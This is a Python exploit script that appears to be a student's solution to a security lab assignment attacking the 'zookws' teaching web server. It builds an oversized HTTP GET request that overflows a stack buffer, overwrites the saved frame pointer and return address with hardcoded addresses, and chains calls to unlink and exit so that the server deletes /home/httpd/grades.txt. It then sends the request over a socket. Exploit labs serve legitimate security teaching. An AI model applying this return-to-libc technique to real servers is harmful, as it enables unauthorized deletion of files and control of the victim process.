#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = 0x12345678
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
    #ebp = "\x18\xf6\xff\xbf"
    a = "GET /"
    ret_unlink ="\x50\x24\x10\x40" #struct.pack("<I",0x40102450) 
    #arg_fd = struct.pack("<I", 5)
    #ebp_exit = struct.pack("<I",0xbffff638)
    ret_exit = struct.pack("<I",0x40058150)
    #ebp_unlink = struct.pack("<I",0xbffff620)  ##pack() or\x48:translate 48 as 8 bit(H) binary of it.
    ebp_unlink = "%20\xf6\xff\xbf" #struct.pack("<I",0xbffff620)  #other way or quote(): translate as a char
    fileaddress = struct.pack("<I",0xbffff628)
    filepath = "/home/httpd/grades.txt%00%00" #31 
    #addr = "%01%00%00%01"
    for i in range(1,2064):  #2072,2064
        a = a + "+"
    
    a = a + ebp_unlink + ret_unlink + ret_exit + fileaddress + filepath

    print("i:%d %s",i,a)
    req =   a + " HTTP/1.0\r\n" + \
            "\r\n"
    print("OK!")
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

